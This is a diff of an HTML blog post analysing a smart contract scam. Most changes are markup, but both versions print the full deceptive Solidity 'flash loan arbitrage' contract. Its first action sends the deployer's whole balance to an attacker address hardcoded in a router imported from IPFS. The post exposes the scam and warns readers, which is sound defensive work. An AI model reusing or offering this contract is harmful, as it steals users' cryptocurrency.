@@ -3,7 +3,7 @@
 
 <head>
   <meta charset="utf-8">
-  <meta name="generator" content="Hugo 0.83.1" />
+  <meta name="generator" content="Hugo 0.97.3" />
 
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <meta name="viewport" content="width=device-width, initial-scale=1">
@@ -38,7 +38,7 @@
   <article class="post">
     <header class="post-header">
       <h1 class="post-title">Analysis of a technical smart contract scam</h1>
-      <time class="post-date" datetime="2021-06-09 18:42:51 &#43;07">09 Jun 2021</time>
+      <time class="post-date" datetime="2021-06-09 18:42:51 &#43;0700">09 Jun 2021</time>
     </header>
 
     <h2 id="introduction">Introduction</h2>
@@ -78,69 +78,68 @@ Apparently, the attacker didn&rsquo;t want it to be too suspicious and made the 
 and big enough to satisfy their greed.</p>
 <p>Second, never ever run a contract if you don&rsquo;t know how it works.
 Here&rsquo;s the contract viewers were instructed to deploy (comments are added by its author):</p>
-<div class="highlight"><pre class="chroma"><code class="language-solidity" data-lang="solidity"><span class="kr">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">5</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
-
-<span class="c1">// PancakeSwap Smart Contracts
-</span><span class="c1"></span><span class="kn">import</span> <span class="s">&#34;https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeCallee.sol&#34;</span><span class="p">;</span>
-<span class="kn">import</span> <span class="s">&#34;https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeFactory.sol&#34;</span><span class="p">;</span>
-
-<span class="c1">//BakerySwp Smart contracts
-</span><span class="c1"></span><span class="kn">import</span> <span class="s">&#34;https://github.com/BakeryProject/bakery-swap-core/blob/master/contracts/interfaces/IBakerySwapFactory.sol&#34;</span><span class="p">;</span>
-
-<span class="c1">// Router
-</span><span class="c1"></span><span class="kn">import</span> <span class="s">&#34;ipfs://QmUSQQNWBJ6snmx5FvafDSBCPCy63BLTpwM61dYjRzwLkN&#34;</span><span class="p">;</span>
-
-<span class="c1">// Multiplier-Finance Smart Contracts
-</span><span class="c1"></span><span class="kn">import</span> <span class="s">&#34;https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPoolAddressesProvider.sol&#34;</span><span class="p">;</span>
-<span class="kn">import</span> <span class="s">&#34;https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPool.sol&#34;</span><span class="p">;</span>
-
-<span class="kd">contract</span> <span class="n">InitiateFlashLoan</span> <span class="p">{</span>
-  <span class="n">RouterV2</span> <span class="n">router</span><span class="p">;</span>
-  <span class="kt">string</span> <span class="kr">public</span> <span class="n">tokenName</span><span class="p">;</span>
-  <span class="kt">string</span> <span class="kr">public</span> <span class="n">tokenSymbol</span><span class="p">;</span>
-  <span class="kt">uint256</span> <span class="n">flashLoanAmount</span><span class="p">;</span>
-
-  <span class="n">constructor</span><span class="p">(</span>
-    <span class="kt">string</span> <span class="kr">memory</span> <span class="n">_tokenName</span><span class="p">,</span>
-    <span class="kt">string</span> <span class="kr">memory</span> <span class="n">_tokenSymbol</span><span class="p">,</span>
-    <span class="kt">uint256</span> <span class="n">_loanAmount</span>
-  <span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
-    <span class="n">tokenName</span> <span class="o">=</span> <span class="n">_tokenName</span><span class="p">;</span>
-    <span class="n">tokenSymbol</span> <span class="o">=</span> <span class="n">_tokenSymbol</span><span class="p">;</span>
-    <span class="n">flashLoanAmount</span> <span class="o">=</span> <span class="n">_loanAmount</span><span class="p">;</span>
-    <span class="n">router</span> <span class="o">=</span> <span class="k">new</span> <span class="n">RouterV2</span><span class="p">();</span>
-  <span class="p">}</span>
-
-  <span class="kd">function</span><span class="p">()</span> <span class="kr">external</span> <span class="kr">payable</span> <span class="p">{}</span>
-
-  <span class="kd">function</span> <span class="n">flashloan</span><span class="p">()</span> <span class="kr">public</span> <span class="kr">payable</span> <span class="p">{</span>
-    <span class="c1">// Send required coins for swap
-</span><span class="c1"></span>    <span class="kt">address</span><span class="p">(</span><span class="kt">uint160</span><span class="p">(</span><span class="n">router</span><span class="p">.</span><span class="n">pancakeSwapAddress</span><span class="p">())).</span><span class="nb">transfer</span><span class="p">(</span>
-      <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">).</span><span class="nb">balance</span>
-    <span class="p">);</span>
-
-    <span class="c1">//Flash loan borrowed 3,137.41 BNB from Multiplier-Finance to make an arbitrage trade on the AMM DEX PancakeSwap.
-</span><span class="c1"></span>    <span class="n">router</span><span class="p">.</span><span class="n">borrowFlashloanFromMultiplier</span><span class="p">(</span>
-      <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span>
-      <span class="n">router</span><span class="p">.</span><span class="n">bakerySwapAddress</span><span class="p">(),</span>
-      <span class="n">flashLoanAmount</span>
-    <span class="p">);</span>
-
-    <span class="c1">//To prepare the arbitrage, BNB is converted to BUSD using PancakeSwap swap contract.
-</span><span class="c1"></span>    <span class="n">router</span><span class="p">.</span><span class="n">convertBnbToBusd</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="n">flashLoanAmount</span> <span class="o">/</span> <span class="mi">2</span><span class="p">);</span>
-
-    <span class="c1">//The arbitrage converts BUSD for BNB using BUSD/BNB PancakeSwap, and then immediately converts BNB back to 3,148.39 BNB using BNB/BUSD BakerySwap.
-</span><span class="c1"></span>    <span class="n">router</span><span class="p">.</span><span class="n">callArbitrageBakerySwap</span><span class="p">(</span><span class="n">router</span><span class="p">.</span><span class="n">bakerySwapAddress</span><span class="p">(),</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">);</span>
-
-    <span class="c1">//After the arbitrage, 3,148.38 BNB is transferred back to Multiplier to pay the loan plus fees. This transaction costs 0.2 BNB of gas.
-</span><span class="c1"></span>    <span class="n">router</span><span class="p">.</span><span class="n">transferBnbToMultiplier</span><span class="p">(</span><span class="n">router</span><span class="p">.</span><span class="n">pancakeSwapAddress</span><span class="p">());</span>
-
-    <span class="c1">//Note that the transaction sender gains 3.29 BNB from the arbitrage, this particular transaction can be repeated as price changes all the time.
-</span><span class="c1"></span>    <span class="n">router</span><span class="p">.</span><span class="n">completeTransation</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">).</span><span class="nb">balance</span><span class="p">);</span>
-  <span class="p">}</span>
-<span class="p">}</span>
-
-</code></pre></div><p>Everything looks kind of ok:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">5</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// PancakeSwap Smart Contracts
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kn">import</span> <span class="s">&#34;https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeCallee.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeFactory.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">//BakerySwp Smart contracts
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kn">import</span> <span class="s">&#34;https://github.com/BakeryProject/bakery-swap-core/blob/master/contracts/interfaces/IBakerySwapFactory.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// Router
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kn">import</span> <span class="s">&#34;ipfs://QmUSQQNWBJ6snmx5FvafDSBCPCy63BLTpwM61dYjRzwLkN&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// Multiplier-Finance Smart Contracts
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kn">import</span> <span class="s">&#34;https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPoolAddressesProvider.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPool.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">InitiateFlashLoan</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="n">RouterV2</span> <span class="n">router</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">string</span> <span class="k">public</span> <span class="n">tokenName</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">string</span> <span class="k">public</span> <span class="n">tokenSymbol</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">uint256</span> <span class="n">flashLoanAmount</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="kd">constructor</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">string</span> <span class="k">memory</span> <span class="n">_tokenName</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">string</span> <span class="k">memory</span> <span class="n">_tokenSymbol</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint256</span> <span class="n">_loanAmount</span>
+</span></span><span class="line"><span class="cl">  <span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">tokenName</span> <span class="o">=</span> <span class="n">_tokenName</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">tokenSymbol</span> <span class="o">=</span> <span class="n">_tokenSymbol</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">flashLoanAmount</span> <span class="o">=</span> <span class="n">_loanAmount</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">router</span> <span class="o">=</span> <span class="k">new</span> <span class="n">RouterV2</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="kd">function</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="kd">function</span> <span class="nf">flashloan</span><span class="p">()</span> <span class="k">public</span> <span class="k">payable</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// Send required coins for swap
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">address</span><span class="p">(</span><span class="kt">uint160</span><span class="p">(</span><span class="n">router</span><span class="p">.</span><span class="n">pancakeSwapAddress</span><span class="p">())).</span><span class="nb">transfer</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">      <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">).</span><span class="nb">balance</span>
+</span></span><span class="line"><span class="cl">    <span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">//Flash loan borrowed 3,137.41 BNB from Multiplier-Finance to make an arbitrage trade on the AMM DEX PancakeSwap.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">router</span><span class="p">.</span><span class="n">borrowFlashloanFromMultiplier</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">      <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">      <span class="n">router</span><span class="p">.</span><span class="n">bakerySwapAddress</span><span class="p">(),</span>
+</span></span><span class="line"><span class="cl">      <span class="n">flashLoanAmount</span>
+</span></span><span class="line"><span class="cl">    <span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">//To prepare the arbitrage, BNB is converted to BUSD using PancakeSwap swap contract.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">router</span><span class="p">.</span><span class="n">convertBnbToBusd</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="n">flashLoanAmount</span> <span class="o">/</span> <span class="mi">2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">//The arbitrage converts BUSD for BNB using BUSD/BNB PancakeSwap, and then immediately converts BNB back to 3,148.39 BNB using BNB/BUSD BakerySwap.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">router</span><span class="p">.</span><span class="n">callArbitrageBakerySwap</span><span class="p">(</span><span class="n">router</span><span class="p">.</span><span class="n">bakerySwapAddress</span><span class="p">(),</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">//After the arbitrage, 3,148.38 BNB is transferred back to Multiplier to pay the loan plus fees. This transaction costs 0.2 BNB of gas.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">router</span><span class="p">.</span><span class="n">transferBnbToMultiplier</span><span class="p">(</span><span class="n">router</span><span class="p">.</span><span class="n">pancakeSwapAddress</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">//Note that the transaction sender gains 3.29 BNB from the arbitrage, this particular transaction can be repeated as price changes all the time.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">router</span><span class="p">.</span><span class="n">completeTransation</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">).</span><span class="nb">balance</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>Everything looks kind of ok:</p>
 <ol>
 <li>Real PancakeSwap, BakerySwap, and Multiplier-Finance contracts are imported.</li>
 <li>A router contract is imported (IPFS? huh?).</li>
@@ -152,17 +151,17 @@ That IPFS import definitely looks suspicious and there&rsquo;s a reason they use
 contract and see what it&rsquo;s doing.</p>
 <p>The Router contract contains a lot of lines to make it noisy and hard to read but it&rsquo;s not hard to find the only
 important part:</p>
-<div class="highlight"><pre class="chroma"><code class="language-solidity" data-lang="solidity"><span class="p">...</span>
-
-<span class="kd">contract</span> <span class="n">RouterV2</span> <span class="p">{</span>
-    <span class="p">...</span>
-    <span class="kd">function</span> <span class="n">pancakeSwapAddress</span><span class="p">()</span> <span class="kr">public</span> <span class="kr">pure</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">address</span><span class="p">)</span> <span class="p">{</span>
-        <span class="k">return</span> <span class="mh">0x2593F13d5b7aC0d766E5768977ca477F9165923a</span><span class="p">;</span>
-    <span class="p">}</span>
-
-    <span class="p">...</span>
-<span class="p">}</span>
-</code></pre></div><p>This is the address the main contract sends all funds to.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="p">...</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">RouterV2</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="p">...</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">pancakeSwapAddress</span><span class="p">()</span> <span class="k">public</span> <span class="k">pure</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">address</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mh">0x2593F13d5b7aC0d766E5768977ca477F9165923a</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="p">...</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>This is the address the main contract sends all funds to.</p>
 <h2 id="conclusion">Conclusion</h2>
 <p>This scam is an interesting case: most scams target non-tech savvy users of cryptocurrencies and this one
 targets those who are aware of flash loan attacks and who knows how to deploy smart contracts and how to interact with them directly.
